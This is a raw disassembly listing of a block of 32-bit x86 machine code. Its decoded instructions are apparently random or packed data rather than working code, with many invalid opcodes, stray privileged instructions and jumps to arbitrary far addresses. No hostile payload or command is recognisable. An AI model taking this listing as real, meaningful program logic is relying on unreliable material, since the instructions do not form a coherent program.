  40a19e:	stos   BYTE PTR es:[edi],al
  40a19f:	adc    DWORD PTR [ebx+0x0],esi
  40a1a2:	pushf  
  40a1a3:	lods   eax,DWORD PTR ds:[esi]
  40a1a4:	enter  0xab46,0x58
  40a1a8:	shl    BYTE PTR [eax],1
  40a1aa:	rcl    DWORD PTR [eax+0x72],1
  40a1ad:	xchg   ecx,eax
  40a1ae:	mov    ah,0x9b
  40a1b0:	or     eax,0xb19b9a0f
  40a1b5:	fild   WORD PTR [ebx]
  40a1b7:	push   ss
  40a1b8:	les    eax,FWORD PTR [eax-0x2f90b926]
  40a1be:	scas   al,BYTE PTR es:[edi]
  40a1bf:	mov    ds:0xbf05ca2e,eax
  40a1c4:	scas   eax,DWORD PTR es:[edi]
  40a1c5:	stos   BYTE PTR es:[edi],al
  40a1c6:	loopne 0x40a228
  40a1c8:	xor    eax,0x47cd2ce2
  40a1cd:	dec    edx
  40a1ce:	out    dx,eax
  40a1cf:	mov    edx,0xb0781797
  40a1d4:	xor    eax,DWORD PTR [ecx]
  40a1d6:	and    al,0xb7
  40a1d8:	jmp    0x7ab4:0x7fde96d2
  40a1df:	lea    esp,[esi+0x7]
  40a1e2:	(bad)  
  40a1e3:	xor    eax,0xd12dd5f8
  40a1e8:	stos   DWORD PTR es:[edi],eax
  40a1e9:	ss pop ds
  40a1eb:	scas   eax,DWORD PTR es:[edi]
  40a1ec:	out    0xee,al
  40a1ee:	(bad)  
  40a1f0:	sub    BYTE PTR ds:0x5581d2df,bh
  40a1f6:	adc    eax,0x3e5bd4f3
  40a1fb:	lea    ecx,[esi]
  40a1fd:	xor    al,0xde
  40a1ff:	pusha  
  40a200:	mov    eax,0x1ffcc34e
  40a205:	clc    
  40a206:	inc    esi
  40a207:	mov    dh,0x4d
  40a209:	test   eax,0xeb79140c
  40a20e:	lahf   
  40a20f:	add    ebp,DWORD PTR [esi+0x59]
  40a212:	test   DWORD PTR [edx+0x7],ebx
  40a215:	test   BYTE PTR [esi+edx*8+0x13],0x60
  40a21a:	lods   eax,DWORD PTR ds:[esi]
  40a21b:	scas   eax,DWORD PTR es:[edi]
  40a21c:	cmp    dh,BYTE PTR [edi]
  40a21e:	(bad)  
  40a21f:	fdivr  QWORD PTR [eax+0x5f57d7c0]
  40a225:	or     dl,al
  40a227:	inc    edx
  40a229:	imul   ebx,DWORD PTR [edx+0x105f8366],0x6ea23ddd
  40a233:	push   edx
  40a234:	repnz es fs mov bl,0xae
  40a239:	aaa    
  40a23a:	inc    esi
  40a23b:	xor    bl,ch
  40a23d:	sbb    al,0x60
  40a23f:	jbe    0x40a1e9
  40a241:	scas   al,BYTE PTR es:[edi]
  40a242:	pop    esi
  40a243:	aas    
  40a244:	xchg   ecx,eax
  40a245:	in     al,dx
  40a246:	or     BYTE PTR [edi+0x550d5d68],0xe1
  40a24d:	shl    BYTE PTR [esi],0x53
  40a250:	aaa    
  40a251:	lods   eax,DWORD PTR ds:[esi]
  40a252:	xor    al,0x8f
  40a254:	in     eax,0x2e
  40a256:	mov    ebp,0xc13bc9cc
  40a25b:	ret    0x2bfc
  40a25e:	bound  esi,QWORD PTR [edx]
  40a260:	aam    0x3e
  40a262:	cdq    
  40a263:	and    eax,0xfff1122a
  40a268:	inc    ebp
  40a269:	dec    ebx
  40a26a:	int    0xd5
  40a26c:	jmp    FWORD PTR [esi]
  40a26e:	retf   0xebbb
  40a271:	loop   0x40a24a
  40a273:	sahf   
  40a274:	out    0x3e,eax
  40a276:	cmp    BYTE PTR [esi+0x10dc2e7c],ch
  40a27c:	das    
  40a27d:	dec    BYTE PTR [ebp+0x60ba6f22]
  40a283:	outs   dx,BYTE PTR ds:[esi]
  40a284:	jns    0x40a25e
  40a286:	dec    ebx
  40a287:	jns    0x40a27e
  40a289:	or     DWORD PTR [ecx+0x31],edi
  40a28c:	adc    BYTE PTR [ecx],dl
  40a28e:	js     0x40a241
  40a290:	pusha  
  40a291:	mov    edi,0x3b8ad0de
  40a296:	and    ecx,edx
  40a298:	mov    cl,0x22
  40a29a:	jo     0x40a29f
  40a29c:	(bad)  
  40a29d:	sub    eax,0x2404e0ac
  40a2a2:	into   
  40a2a3:	sub    ebp,ebx
  40a2a5:	cdq    
  40a2a6:	pop    eax
  40a2a7:	cwde   
  40a2a8:	pop    ebx
  40a2a9:	lods   al,BYTE PTR ds:[esi]
  40a2aa:	push   ds
  40a2ab:	jmp    0x40a250
  40a2ad:	leave  
  40a2ae:	sbb    cl,ch
  40a2b0:	ins    DWORD PTR es:[edi],dx
  40a2b1:	mov    BYTE PTR ds:0x43669259,cl
  40a2b7:	push   ecx
  40a2b8:	loopne 0x40a2fa
  40a2ba:	ds pop edx
  40a2bc:	adc    ah,BYTE PTR [ebp+0x4b221754]
  40a2c2:	mov    ebp,0x62dc2820
  40a2c7:	sti    
  40a2c8:	shl    esi,0x66
  40a2cb:	and    ebp,esi
  40a2cd:	push   esp
  40a2ce:	shr    BYTE PTR [esi+0x7e],cl
  40a2d1:	mov    esp,0xf42882f3
  40a2d6:	add    al,0x47
  40a2d8:	int    0x92
  40a2da:	mov    DWORD PTR [esi+0x696ea035],ebx
  40a2e0:	call   0xf6383b5
  40a2e5:	jle    0x40a28e
  40a2e7:	je     0x40a283
  40a2e9:	xchg   esp,eax
  40a2ea:	pop    ecx
  40a2eb:	pop    ecx
  40a2ec:	and    ebp,DWORD PTR [ebp-0xc]
  40a2ef:	cmp    BYTE PTR [edi-0x4f],dh
  40a2f2:	fnsave [esi]
  40a2f4:	ins    BYTE PTR es:[edi],dx
  40a2f5:	es sahf 
  40a2f7:	sar    BYTE PTR [ebx-0x2e13cce6],0xfe
  40a2fe:	and    eax,0x753cd744
  40a303:	loope  0x40a2d9
  40a305:	add    dh,0x81
  40a308:	and    BYTE PTR [esp+edx*8],ah
  40a30b:	das    
  40a30c:	adc    dl,BYTE PTR [esi+0x28]
  40a30f:	adc    BYTE PTR [ecx-0x26ff5cc1],ah
  40a315:	mov    ?,WORD PTR [edx+edi*8+0x13]
  40a319:	cmc    
  40a31a:	(bad)  
  40a31b:	push   0xffffffcb
  40a31d:	sub    eax,0x75f6dd3d
  40a322:	mov    al,0x9b
  40a324:	mov    al,0x71
  40a326:	rol    cl,cl
  40a328:	jo     0x40a319
  40a32a:	jne    0x40a360
  40a32c:	gs rcl edi,1
  40a32f:	cmp    BYTE PTR [edx],dh
  40a331:	mov    DWORD PTR [ebp-0x287e3a92],edx
  40a337:	loope  0x40a35a
  40a339:	(bad)  
  40a33a:	jmp    0x39a72abd
  40a33f:	or     al,0xe5
  40a341:	dec    esi
  40a342:	ficomp DWORD PTR [esi]
  40a344:	adc    DWORD PTR [edx-0x16c9b407],esi
  40a34a:	leave  
  40a34b:	xor    eax,eax
  40a34d:	mov    dl,0xd4
  40a34f:	retf   0xb033
  40a352:	pop    esp
  40a353:	dec    edx
  40a354:	pop    ecx
  40a355:	push   edx
  40a356:	sbb    BYTE PTR [ecx],bh
  40a358:	mov    ch,0xe
  40a35a:	out    dx,eax
  40a35b:	cwde   
  40a35c:	and    eax,esi
  40a35e:	fild   DWORD PTR [esi]
  40a360:	push   ebp
  40a361:	sbb    edx,DWORD PTR [esi]
  40a363:	iret   
  40a364:	icebp  
  40a365:	shl    ah,0x32
  40a368:	cli    
  40a369:	xchg   BYTE PTR [edx+0x14],ch
  40a36c:	sbb    ebp,eax
  40a36e:	mov    bl,0xa6
  40a370:	sub    bl,BYTE PTR [edx+0x55]
  40a373:	or     esi,DWORD PTR ds:0xf53585f9
  40a379:	sub    DWORD PTR [esi+0x4cc12741],esp
  40a37f:	or     al,0x6f
  40a381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a382:	in     al,dx
  40a383:	xchg   edi,eax
  40a384:	cdq    
  40a385:	cdq    
  40a386:	or     eax,0x9204615
  40a38b:	dec    ebp
  40a38c:	dec    esi
  40a38d:	xchg   ebx,eax
  40a38e:	sub    al,0x60
  40a390:	scas   al,BYTE PTR es:[edi]
  40a391:	test   DWORD PTR [edx-0x6300237c],edi
  40a397:	sbb    ecx,ebp
  40a399:	adc    dl,BYTE PTR [edx+0x7a]
  40a39c:	pushf  
  40a39d:	adc    BYTE PTR [esi+0x7d481938],ch
  40a3a3:	repnz push ss
  40a3a5:	idiv   BYTE PTR [eax+0x2d]
  40a3a8:	stos   DWORD PTR es:[edi],eax
  40a3a9:	lock sub eax,0x5fe89c97
  40a3af:	jp     0x40a426
  40a3b1:	adc    DWORD PTR [edi-0x481bf540],ecx
  40a3b7:	mov    edi,0xe2f6ff
  40a3bc:	aam    0xf7
  40a3be:	scas   eax,DWORD PTR es:[edi]
  40a3bf:	mov    esi,0x3ce69a78
  40a3c4:	push   ebx
  40a3c5:	mov    bl,BYTE PTR [eax-0x1a]
  40a3c8:	xchg   BYTE PTR [ebp+0x2354a5ff],cl
  40a3ce:	mov    ah,0xf9
  40a3d0:	ins    BYTE PTR es:[edi],dx
  40a3d1:	jecxz  0x40a401
  40a3d3:	fadd   DWORD PTR [esi+ebp*2+0x2d]
  40a3d7:	jle    0x40a44a
  40a3d9:	shl    BYTE PTR ds:0x9ca01f25,cl
  40a3df:	sub    ebp,DWORD PTR [edx-0x2074480a]
  40a3e5:	mov    esi,0x7d8140e9
  40a3ea:	pop    ss
  40a3eb:	outs   dx,DWORD PTR ds:[esi]
  40a3ec:	and    BYTE PTR [edx],al
  40a3ee:	das    
  40a3ef:	outs   dx,BYTE PTR gs:[esi]
  40a3f1:	or     BYTE PTR [esi],bl
  40a3f3:	test   DWORD PTR [esi],eax
  40a3f5:	mov    esp,0x82b08727
  40a3fa:	jl     0x40a42f
  40a3fc:	nop
  40a3fd:	repz aaa 
  40a3ff:	dec    ecx
  40a400:	outs   dx,BYTE PTR ds:[esi]
  40a401:	rcr    BYTE PTR [esi-0x52a122d3],1
  40a407:	nop
  40a408:	loope  0x40a3c9
  40a40a:	jns    0x40a42b
  40a40c:	xor    dh,cl
  40a40e:	xor    BYTE PTR [ebx],al
  40a410:	test   BYTE PTR [eax+0x7f],bh
  40a413:	xor    eax,0xff3296b8
  40a418:	aad    0x51
  40a41a:	sti    
  40a41b:	test   eax,0x7d37bc47
  40a420:	mov    bl,0xbe
  40a422:	stc    
  40a423:	jae    0x40a3c1
  40a425:	mov    cs,WORD PTR [eax]
  40a427:	pop    esp
  40a428:	scas   al,BYTE PTR es:[edi]
  40a429:	mov    bl,0xad
  40a42b:	push   es
  40a42c:	xchg   ebp,eax
  40a42d:	in     eax,dx
  40a42e:	(bad)  
  40a42f:	fadd   st,st(3)
  40a431:	and    edi,ebx
  40a433:	jecxz  0x40a406
  40a435:	push   es
  40a436:	imul   ebp,DWORD PTR [edi],0xbb95e8c4
  40a43c:	jg     0x40a3cd
  40a43e:	jge    0x40a3f5
  40a440:	pop    ebx
  40a441:	aad    0x47
  40a443:	sub    DWORD PTR [edx-0x2],esi
  40a446:	clc    
  40a447:	mov    ch,0xf2
  40a449:	or     ebx,DWORD PTR [edx+ecx*4+0x1c]
  40a44d:	push   edi
  40a44e:	fild   WORD PTR [eax+0x52]
  40a451:	(bad)  
  40a452:	jb     0x40a469
  40a454:	push   eax
  40a455:	ret    
  40a456:	mov    BYTE PTR es:[ecx+0x23],dl
  40a45a:	dec    eax
  40a45b:	aam    0x9c
  40a45d:	rol    DWORD PTR [ecx],1
  40a45f:	pop    esp
  40a460:	lods   al,BYTE PTR ds:[esi]
  40a461:	ret    0x3f3a
  40a464:	loopne 0x40a466
  40a466:	ret    0x6e4e
  40a469:	jns    0x40a436
  40a46b:	dec    esi
  40a46c:	loop   0x40a45d
  40a46e:	rol    al,cl
  40a470:	adc    ah,dh
  40a472:	pusha  
  40a473:	mov    bl,0xd1
  40a475:	xor    DWORD PTR [ebx-0x39],edi
  40a478:	sbb    al,0xf8
  40a47a:	aas    
  40a47b:	lods   eax,DWORD PTR ds:[esi]
  40a47c:	pushf  
  40a47d:	fwait
  40a47e:	pop    esi
  40a47f:	push   ecx
  40a480:	dec    esp
  40a481:	pop    edx
  40a482:	xor    esi,DWORD PTR [ecx-0x437b7b27]
  40a488:	push   0x962548bd
  40a48d:	add    DWORD PTR [eax+0x7b],0xfb2c2250
  40a494:	jbe    0x40a4dd
  40a496:	mov    esi,cs
  40a498:	or     ch,BYTE PTR [esi+edx*2-0x5f]
  40a49c:	adc    al,0x96
  40a49e:	push   ecx
  40a49f:	popa   
  40a4a0:	jb     0x40a510
  40a4a2:	dec    edx
  40a4a3:	sbb    esp,esi
  40a4a5:	fcom   DWORD PTR [ebx]
  40a4a7:	jo     0x40a526
  40a4a9:	inc    ebp
  40a4aa:	jg     0x40a4f5
  40a4ac:	stos   DWORD PTR es:[edi],eax
  40a4ad:	out    dx,al
  40a4ae:	sbb    dl,bl
  40a4b0:	ror    DWORD PTR [esi],cl
  40a4b2:	lods   eax,DWORD PTR ds:[esi]
  40a4b3:	xor    eax,0xf85c65ad
  40a4b8:	je     0x40a4dd
  40a4ba:	xor    BYTE PTR [edi+0x27],bh
  40a4bd:	add    dl,ch
  40a4bf:	loope  0x40a495
  40a4c1:	push   esp
  40a4c2:	aam    0x7e
  40a4c4:	xor    edi,DWORD PTR ds:[ecx-0x1b37f752]
  40a4cb:	jns    0x40a546
  40a4cd:	popa   
  40a4ce:	in     al,0xcd
  40a4d0:	cmp    DWORD PTR [ebp+0x710ec881],edi
  40a4d6:	cdq    
  40a4d7:	pop    eax
  40a4d8:	mov    ch,0xc0
  40a4da:	loope  0x40a4d3
  40a4dc:	rep outs dx,BYTE PTR ds:[esi]
  40a4de:	xchg   edx,eax
  40a4df:	pop    eax
  40a4e0:	mov    ch,0x11
  40a4e2:	ret    
  40a4e3:	mov    edi,0x99549052
  40a4e8:	xchg   DWORD PTR [ebx+0x33],edi
  40a4eb:	std    
  40a4ec:	jp     0x40a4d3
  40a4ee:	sbb    al,0xb7
  40a4f0:	sub    ecx,edx
  40a4f2:	dec    edx
  40a4f3:	push   ebp
  40a4f4:	jae    0x40a513
  40a4f6:	pop    ebx
  40a4f7:	mov    ecx,0x471d557e
  40a4fc:	inc    eax
  40a4fd:	dec    edx
  40a4fe:	fldl2t 
  40a500:	sbb    bh,BYTE PTR [eax+esi*8+0xf]
  40a504:	xchg   ebp,eax
  40a505:	sbb    DWORD PTR [ebp-0x770f03d3],esp
  40a50b:	div    DWORD PTR [esi+0x67]
  40a50e:	xor    BYTE PTR [esi+0xb8171a0],ch
  40a514:	push   es
  40a515:	or     eax,0xfc25d3aa
  40a51a:	lahf   
  40a51b:	loopne 0x40a549
  40a51d:	stos   DWORD PTR es:[edi],eax
  40a51e:	push   edi
  40a51f:	mov    BYTE PTR [ebx+0x556c1ee4],dh
  40a525:	(bad)  
  40a526:	and    dl,cl
  40a528:	dec    ebx
  40a529:	xor    dl,ah
  40a52b:	int3   
  40a52c:	int    0x48
  40a52e:	xlat   BYTE PTR ds:[ebx]
  40a52f:	sub    al,0xd9
  40a531:	cmp    DWORD PTR ds:0x5b6590c5,edi
  40a537:	xlat   BYTE PTR ds:[ebx]
  40a538:	mov    bl,0xb4
  40a53a:	retf   
  40a53b:	mov    bl,0x2b
  40a53d:	repnz cmp eax,0x61f52bf1
  40a543:	cs call 0x7b16:0xf91234f0
  40a54b:	sub    bl,BYTE PTR [edi-0x74]
  40a54e:	sub    edi,DWORD PTR [ecx+eiz*8]
  40a551:	test   eax,0xe69c57a1
  40a556:	dec    ecx
  40a557:	out    0x38,al
  40a559:	xchg   esi,eax
  40a55a:	add    ah,al
  40a55c:	paddusw mm2,QWORD PTR [ebp+eax*2-0x8]
  40a561:	pop    esi
  40a562:	pop    esp
  40a563:	mov    ebp,0xfc60e8c2
  40a568:	jge    0x40a5c0
  40a56a:	test   BYTE PTR [esi],0x35
  40a56d:	inc    ebx
  40a56e:	or     DWORD PTR [ebp-0x41],eax
  40a571:	mov    ebx,0x6197c832
  40a576:	add    BYTE PTR [ecx],dl
  40a578:	mov    dl,0xc9
  40a57a:	test   DWORD PTR [eax-0x124f7e26],ecx
  40a580:	(bad)  
  40a581:	jmp    0xe5c144db
  40a586:	cmp    eax,0x8cd56ddd
  40a58b:	add    DWORD PTR [edi],ebx
  40a58d:	in     al,0x6f
  40a58f:	mov    ecx,0xf4821606
  40a594:	mov    ah,BYTE PTR [esi+0x2f]
  40a597:	mov    bl,0x22
  40a599:	cwde   
  40a59a:	jno    0x40a61b
  40a59c:	mov    ds:0x63e5c5c1,al
  40a5a1:	or     dh,cl
  40a5a3:	fs jmp 0x40a5dc
  40a5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5a7:	jg     0x40a5c4
  40a5a9:	idiv   BYTE PTR fs:[edi-0x19]
  40a5ad:	sbb    cl,dh
  40a5af:	je     0x40a5fb
  40a5b1:	cdq    
  40a5b2:	stos   DWORD PTR es:[edi],eax
  40a5b3:	fisub  DWORD PTR [ecx+0x33e12ac1]
  40a5b9:	sub    al,BYTE PTR [ebp-0x68b1c0b8]
  40a5bf:	push   ecx
  40a5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5c1:	dec    esp
  40a5c2:	sub    BYTE PTR [ebx+0xd50634a],dh
  40a5c8:	add    DWORD PTR [eax+0x3bcd559f],esp
  40a5ce:	cmp    BYTE PTR [eax-0xb],bl
  40a5d1:	loop   0x40a602
  40a5d3:	pop    ds
  40a5d4:	and    eax,eax
  40a5d6:	sbb    ecx,DWORD PTR [eax]
  40a5d8:	data16 (bad) 
  40a5da:	sahf   
  40a5db:	mov    edi,0xf6b989de
  40a5e0:	aam    0xee
  40a5e2:	bound  esp,QWORD PTR [ebx+0x42]
  40a5e5:	jne    0x40a5b0
  40a5e7:	popa   
  40a5e8:	mov    bl,0xeb
  40a5ea:	mov    cl,0x79
  40a5ec:	adc    ebx,ecx
  40a5ee:	ret    0x8e55
  40a5f1:	xchg   esi,eax
  40a5f2:	inc    edi
  40a5f3:	ins    DWORD PTR es:[edi],dx
  40a5f4:	pushf  
  40a5f5:	mov    esp,0x6333f50c
  40a5fa:	dec    ebp
  40a5fb:	aaa    
  40a5fc:	mov    es,ecx
  40a5fe:	jmp    0x9ea8:0xc3e1c432
  40a605:	pop    eax
  40a606:	pop    es
  40a607:	mov    dh,0xbc
  40a609:	push   ebx
  40a60a:	mov    eax,0x33578ff9
  40a60f:	ret    0xb150
  40a612:	push   0x17be0564
  40a617:	xor    esp,DWORD PTR [esi+ebp*8]
  40a61a:	cwde   
  40a61b:	pushf  
  40a61c:	cmp    bl,BYTE PTR [eax+0x3ac014d2]
  40a622:	mov    ebx,0x8a34b32e
  40a627:	xchg   BYTE PTR [ebp-0x471edaa9],bl
  40a62d:	stos   BYTE PTR es:[edi],al
  40a62e:	div    ebp
  40a630:	ja     0x40a631
  40a632:	(bad)  
  40a633:	mov    ebp,0xaff94c7
  40a638:	enter  0xd762,0x4a
  40a63c:	iret   
  40a63d:	jecxz  0x40a6b1
  40a63f:	push   ss
  40a640:	fsubr  DWORD PTR [ebp+0x24]
  40a643:	inc    ebp
  40a644:	xor    edi,eax
  40a646:	das    
  40a647:	clc    
  40a648:	pop    ss
  40a649:	mov    cl,0x2d
  40a64b:	add    ebx,edx
  40a64d:	je     0x40a6c6
  40a64f:	inc    edi
  40a650:	sub    eax,0x93bd482b
  40a655:	shl    ah,1
  40a657:	sub    BYTE PTR [ebx],ah
  40a659:	push   esp
  40a65a:	cmp    cl,BYTE PTR [ebp+0x56]
  40a65d:	aaa    
  40a65e:	ret    
  40a65f:	sbb    BYTE PTR [ecx+0x4a17fedb],bl
  40a665:	add    ebx,DWORD PTR [edi+0xb]
  40a668:	ins    BYTE PTR es:[edi],dx
  40a669:	push   ds
  40a66a:	fistp  WORD PTR [edx+0x1a]
  40a66d:	inc    esi
  40a66e:	or     BYTE PTR [esi],0x69
  40a671:	jae    0x40a699
  40a673:	imul   esi,eax,0x7c
  40a676:	add    BYTE PTR [eax],ah
  40a678:	and    BYTE PTR [eax-0x56],ah
  40a67b:	ficomp WORD PTR [ecx+0xb]
  40a67e:	dec    edx
  40a67f:	jmp    0x9da7:0xf4126499
  40a686:	jp     0x40a6bd
  40a688:	mov    bh,0xbb
  40a68a:	add    ebp,ecx
  40a68c:	adc    al,0x2e
  40a68e:	mov    al,ds:0xae754f0d
  40a693:	loope  0x40a61c
  40a695:	xor    edx,DWORD PTR [ebp-0x7548f39]
  40a69b:	in     al,dx
  40a69c:	or     DWORD PTR [eax-0x17],esp
  40a69f:	fsub   st,st(1)
  40a6a1:	xchg   ecx,eax
  40a6a2:	jecxz  0x40a6ef
  40a6a4:	les    edi,FWORD PTR [esi+0x67]
  40a6a7:	mov    ?,WORD PTR [ecx]
  40a6a9:	pushf  
  40a6aa:	jne    0x40a6fd
  40a6ac:	push   edi
  40a6ad:	retf   0x59
  40a6b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6b1:	or     ebx,DWORD PTR [ebp-0x4a]
  40a6b4:	(bad)  
  40a6b5:	jmp    0x1863:0x1cf700c
  40a6bc:	sar    BYTE PTR ds:0x2a254e04,0xfe
  40a6c3:	test   BYTE PTR [ecx+0x50],al
  40a6c6:	fcom   st(1)
  40a6c8:	mov    cl,BYTE PTR [ecx+0x438741f8]
  40a6ce:	xchg   esi,eax
  40a6cf:	xchg   esp,eax
  40a6d0:	mov    eax,ds:0x6e2c09a7
  40a6d5:	pop    edx
  40a6d6:	inc    ebx
  40a6d7:	xchg   DWORD PTR [eax-0x68],edi
  40a6da:	pop    edi
  40a6db:	ja     0x40a694
  40a6dd:	jb     0x40a6d6
  40a6df:	(bad)  
  40a6e0:	loop   0x40a6a1
  40a6e2:	jge    0x40a674
  40a6e4:	jbe    0x40a696
  40a6e6:	ret    
  40a6e7:	jge    0x40a75f
  40a6e9:	xchg   esp,eax
  40a6ea:	outs   dx,BYTE PTR ds:[esi]
  40a6eb:	cmp    ecx,DWORD PTR [eax]
  40a6ed:	or     ecx,DWORD PTR [edx]
  40a6ef:	daa    
  40a6f0:	es jmp 0xc98:0x1efcda25
  40a6f8:	test   BYTE PTR [edx-0x18f7889c],bh
  40a6fe:	mov    ch,0xb2
  40a700:	push   0xad9f056c
  40a705:	mov    ds:0x97b05c16,al
  40a70a:	mov    ebp,0x8eaf569d
  40a70f:	imul   esi,DWORD PTR [esi],0x8a19c48a
  40a715:	xor    BYTE PTR [edx],ch
  40a717:	mul    BYTE PTR [ebp-0x5732fca1]
  40a71d:	and    DWORD PTR [edi+ecx*4],edx
  40a720:	aas    
  40a721:	pop    ebp
  40a722:	(bad)  
  40a723:	test   edi,0xae41d4b5
  40a729:	out    dx,eax
  40a72a:	dec    eax
  40a72b:	pop    esi
  40a72c:	mov    ss,WORD PTR [ebp-0x55]
  40a72f:	rcl    BYTE PTR [ebp+0x58],0xbe
  40a733:	jp     0x40a78f
  40a735:	ret    
  40a736:	imul   eax,DWORD PTR [edi+0x4d],0x843bfad1
  40a73d:	lds    esp,FWORD PTR [edx+0x5a9daa34]
  40a743:	sti    
  40a744:	lea    ebx,[edx+ecx*2-0x4b75e02f]
  40a74b:	(bad)  
  40a74c:	pop    ebx
  40a74d:	in     eax,dx
  40a74e:	es push ds
  40a750:	mov    ch,0x46
  40a752:	scas   al,BYTE PTR es:[edi]
  40a753:	dec    eax
  40a754:	inc    ebp
  40a755:	out    0xc8,al
  40a757:	push   ebp
  40a758:	gs or  ah,0x7b
  40a75c:	jge    0x40a767
  40a75e:	inc    esp
  40a75f:	add    DWORD PTR [ecx-0x33dab076],esp
  40a765:	push   ebx
  40a766:	pop    ds
  40a767:	popa   
  40a768:	gs dec ebx
  40a76a:	xor    edi,DWORD PTR [eax]
  40a76c:	jmp    0x40a71d
  40a76e:	dec    esp
  40a76f:	sbb    al,0xdc
  40a771:	mov    al,BYTE PTR [eax-0x55]
  40a774:	fs inc esp
  40a776:	or     BYTE PTR [ebx-0x2d],bl
  40a779:	scas   al,BYTE PTR es:[edi]
  40a77a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a77b:	and    BYTE PTR [eax-0x1b14a7d6],dl
  40a781:	aad    0xf3
  40a783:	push   edx
  40a784:	loope  0x40a76b
  40a786:	inc    edi
  40a787:	add    eax,0x5a583699
  40a78c:	pop    ecx
  40a78d:	jecxz  0x40a715
  40a78f:	or     eax,0xa2da5dbc
  40a794:	fwait
  40a795:	sbb    ebp,DWORD PTR [ecx]
  40a797:	mov    esi,0xebbb1666
  40a79c:	pop    ds
  40a79d:	sbb    al,0x8c
  40a79f:	mov    ds:0x22e0eb79,al
  40a7a4:	sbb    ebx,edx
  40a7a6:	sbb    ebp,ecx
  40a7a8:	test   DWORD PTR [ebp+0x57],esp
  40a7ab:	adc    al,0x69
  40a7ad:	setge  dl
  40a7b0:	pop    ds
  40a7b1:	push   es
  40a7b2:	xchg   edi,eax
  40a7b3:	jbe    0x40a77d
  40a7b5:	xor    al,bh
  40a7b7:	gs jg  0x40a7c0
  40a7ba:	and    al,0x1d
  40a7bc:	or     bh,BYTE PTR [ebp-0x3d]
  40a7bf:	or     ebp,DWORD PTR [eax*8-0x6d6fecd1]
  40a7c6:	nop
  40a7c7:	rcl    cl,0xa3
  40a7ca:	loop   0x40a780
  40a7cc:	scas   eax,DWORD PTR es:[edi]
  40a7cd:	(bad)  
  40a7ce:	mov    ecx,0xa869d433
  40a7d3:	in     al,dx
  40a7d4:	jg     0x40a7f8
  40a7d6:	mov    ds:0x5a357478,eax
  40a7db:	icebp  
  40a7dc:	sti    
  40a7dd:	mov    eax,DWORD PTR [ecx+0x74]
  40a7e0:	sub    BYTE PTR [eax+0x1f],al
  40a7e3:	jnp    0x40a7a9
  40a7e5:	retf   
  40a7e6:	mov    dl,BYTE PTR [ebx+0x63511447]
  40a7ec:	mov    BYTE PTR [eax-0x2dfc8102],0x2b
  40a7f3:	mov    ebx,0x2f0783eb
  40a7f8:	data16 add BYTE PTR [ecx-0x247ba23f],ah
  40a7ff:	imul   bh
  40a801:	fimul  WORD PTR [ebx+0x79]
  40a804:	xor    edx,DWORD PTR [eax+0x5b]
  40a807:	mov    edi,0x6f0815ad
  40a80c:	adc    ah,ch
  40a80e:	xchg   edi,eax
  40a80f:	jmp    0x40a800
  40a811:	jnp    0x40a837
  40a813:	fsubr  QWORD PTR [esi-0x61]
  40a816:	cmp    cl,BYTE PTR [ebp+0x3d]
  40a819:	outs   dx,BYTE PTR ds:[esi]
  40a81a:	pusha  
  40a81b:	out    0x9b,al
  40a81d:	xor    eax,0x92484644
  40a822:	cmp    cl,BYTE PTR [edi+0x59]
  40a825:	mov    ebp,0xfaa8a1ff
  40a82a:	xchg   esp,eax
  40a82b:	pop    edi
  40a82c:	jge    0x40a7b7
  40a82e:	movsx  ecx,dh
  40a831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a832:	xchg   esi,eax
  40a833:	or     BYTE PTR [esi],dl
  40a835:	ficom  WORD PTR [ebp+ebp*8+0x35]
  40a839:	adc    al,0xd0
  40a83b:	sbb    BYTE PTR ds:0x4f1c6d96,ch
  40a841:	add    al,0x58
  40a843:	fcmove st,st(1)
  40a845:	jmp    0x8e81e204
  40a84a:	push   edx
  40a84b:	imul   esi,eax,0xe064ee64
  40a851:	(bad)  
  40a852:	fdivr  QWORD PTR [esi+0x72da9477]
  40a858:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a859:	sbb    eax,0x466c6061
  40a85e:	push   edx
  40a85f:	xchg   esp,eax
  40a860:	rcr    BYTE PTR [ebx],cl
  40a862:	or     al,0x47
  40a864:	imul   BYTE PTR [eax+0x66fe7cf7]
  40a86a:	aam    0xa5
  40a86c:	sbb    ebp,DWORD PTR [esi+0x579d65a9]
  40a872:	das    
  40a873:	or     bl,BYTE PTR [edi+ebp*8]
  40a876:	loopne 0x40a817
  40a878:	pop    si
  40a87a:	xchg   ebx,eax
  40a87b:	outs   dx,DWORD PTR ds:[esi]
  40a87c:	fdiv   DWORD PTR [esi]
  40a87e:	cmp    edi,ebp
  40a880:	push   edx
  40a881:	pop    esp
  40a882:	cmp    esi,edi
  40a884:	jecxz  0x40a8c0
  40a886:	lar    esp,WORD PTR [esi+0x3b96421a]
  40a88d:	sahf   
  40a88e:	xor    al,0x28
  40a890:	dec    ecx
  40a891:	inc    ebx
  40a892:	jne    0x40a90f
  40a894:	xchg   ebp,eax
  40a895:	pop    es
  40a896:	int    0x74
  40a898:	jb     0x40a84f
  40a89a:	and    esp,DWORD PTR [edi+eax*2+0xa]
  40a89e:	sbb    al,0x26
  40a8a0:	jl     0x40a8df
  40a8a2:	test   DWORD PTR [ecx+ecx*8+0x3637fa4b],esp
  40a8a9:	push   ebx
  40a8aa:	jle    0x40a8cb
  40a8ac:	xor    eax,0xb07b43c4
  40a8b1:	push   es
  40a8b2:	aad    0xd1
  40a8b4:	lock lods eax,DWORD PTR ds:[esi]
  40a8b6:	add    al,0x6d
  40a8b8:	mov    edi,0xf399ce0f
  40a8bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8be:	retf   0x4770
  40a8c1:	jg     0x40a87e
  40a8c3:	cmp    al,0x8f
  40a8c5:	and    ah,ch
  40a8c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8c8:	(bad)  
  40a8c9:	mov    esi,0x26ee3d0f
  40a8ce:	xor    BYTE PTR [ecx-0x3219e1b5],0x86
  40a8d5:	xchg   DWORD PTR [esi+0x1ac5edc4],ebx
  40a8db:	mov    cl,0xf7
  40a8dd:	add    eax,0xee812ae0
  40a8e2:	mov    edx,0xe9ba5aa5
  40a8e7:	mov    dh,0xe7
